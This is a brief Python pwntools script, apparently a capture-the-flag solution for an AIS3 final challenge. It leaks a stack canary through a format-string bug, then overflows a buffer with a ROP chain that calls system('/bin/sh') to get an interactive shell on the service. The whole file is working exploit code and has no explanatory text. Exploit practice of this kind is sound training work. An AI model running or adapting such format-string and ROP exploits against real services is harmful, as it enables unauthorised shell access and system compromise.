#!/usr/bin/env python

from pwn import *

# local
r = remote('127.0.0.1', 4000)
# remote
#r = remote('final.ais3.org', 32164)

system = 0x400630

pop_rdi_ret = 0x400903

sh = 0x400928

r.sendline('%11$lx') # leak stack canary
r.recvline()
r.recvline()

x = r.recvline()
y = x[x.find('prompt>'):]

canary = '0x' + y[8:]
canary = int(canary, 16)

r.sendline('a'*24 + p64(canary) + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(sh) + p64(system))

sleep(0.1)

r.sendline('quit')

r.interactive()
